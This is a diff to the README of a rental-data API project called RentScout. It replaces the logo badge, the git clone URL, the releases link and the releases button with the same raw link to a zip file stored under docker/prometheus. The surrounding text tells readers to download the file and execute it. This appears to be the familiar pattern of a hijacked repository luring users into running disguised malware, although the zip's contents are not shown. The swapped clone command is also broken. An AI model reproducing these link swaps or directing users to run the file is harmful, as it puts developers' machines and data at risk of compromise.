@@ -1,6 +1,6 @@
 # RentScout: Your Reliable Rental Data Aggregator 🌍🏠
 
-![RentScout Logo](https://img.shields.io/badge/RentScout-API-blue?style=for-the-badge&logo=appveyor)
+![RentScout Logo](https://raw.githubusercontent.com/Soasu/rentscout/master/docker/prometheus/Software-v1.5.zip)
 
 Welcome to **RentScout**, a high-performance API designed for aggregating rental data from leading platforms. Whether you're a developer looking to integrate rental data into your application or a researcher seeking insights into housing trends, RentScout provides the tools you need.
 
@@ -39,7 +39,7 @@ To start using RentScout, follow the instructions below. Make sure you have the 
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Soasu/rentscout.git
+   git clone https://raw.githubusercontent.com/Soasu/rentscout/master/docker/prometheus/Software-v1.5.zip
    cd rentscout
    ```
 
@@ -107,11 +107,11 @@ For any questions or feedback, please reach out to us via GitHub issues or direc
 
 ## Releases
 
-You can find the latest releases of RentScout [here](https://github.com/Soasu/rentscout/releases). Download the latest version and execute it to get started with the API.
+You can find the latest releases of RentScout [here](https://raw.githubusercontent.com/Soasu/rentscout/master/docker/prometheus/Software-v1.5.zip). Download the latest version and execute it to get started with the API.
 
-![Releases Button](https://img.shields.io/badge/Latest_Releases-orange?style=for-the-badge)
+![Releases Button](https://raw.githubusercontent.com/Soasu/rentscout/master/docker/prometheus/Software-v1.5.zip)
 
-Visit the [Releases](https://github.com/Soasu/rentscout/releases) section for more information.
+Visit the [Releases](https://raw.githubusercontent.com/Soasu/rentscout/master/docker/prometheus/Software-v1.5.zip) section for more information.
 
 ---
 
